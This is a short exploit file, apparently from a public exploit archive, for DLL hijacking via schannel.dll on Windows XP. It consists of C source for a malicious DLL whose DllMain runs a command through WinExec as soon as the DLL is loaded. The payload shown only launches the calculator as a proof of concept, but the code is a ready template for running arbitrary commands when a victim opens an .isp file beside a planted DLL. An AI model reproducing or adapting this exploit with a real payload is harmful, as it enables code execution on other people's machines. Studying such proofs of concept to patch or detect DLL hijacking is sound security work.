/*
# Exploit Title: Windows Internet Communication Settings DLL Hijacking Exploit 
(schannel.dll)
# Date: 25/08/2010
# Author: ALPdaemon
# Email: ALPdaemon (at) yahoo (dot) com
# Software Link: N/A
# Tested on: Windows XP SP3 English
# Extension: .isp
*/
#include <windows.h>

int alpdaemon()
{
  WinExec("calc", SW_SHOW);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  alpdaemon();
  return 0;
}


      